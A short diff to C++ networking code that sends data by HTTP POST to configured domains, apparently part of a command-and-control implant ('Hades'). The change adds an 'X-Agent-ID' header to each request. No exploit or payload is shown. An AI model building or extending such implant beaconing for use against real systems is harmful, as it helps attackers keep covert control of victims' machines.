@@ -54,6 +54,8 @@ BOOL Network::DoPostSingle(PBYTE toSend, SIZE_T len, DomainEntry* domain) {
 	BOOL ok = FALSE;
 
 	DEBUG_LOG("Sending Request to %s%s\n", domain->domain, conf->PostEndpoint);
+	char buf[64];
+	snprintf(buf, 64, "X-Agent-ID: %u\r\n", this->HadesID);
 	hInternrt = this->HttpApis->InternetOpenA(conf->UA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
 	if (!hInternrt) goto CLEANUP;
 
@@ -67,6 +69,7 @@ BOOL Network::DoPostSingle(PBYTE toSend, SIZE_T len, DomainEntry* domain) {
 
 	hRequest = this->HttpApis->HttpOpenRequestA(hConnect, "POST", conf->PostEndpoint, NULL, NULL, NULL, flags, 0);
 	if (!hRequest) goto CLEANUP;
+	this->HttpApis->HttpAddRequestHeadersA(hRequest, buf, (DWORD)-1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
 	this->HttpApis->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &this->reqFlags, sizeof(this->reqFlags));
 
 	if (!this->HttpApis->HttpSendRequestA(hRequest, NULL, 0, (LPVOID)toSend, len)) goto CLEANUP;
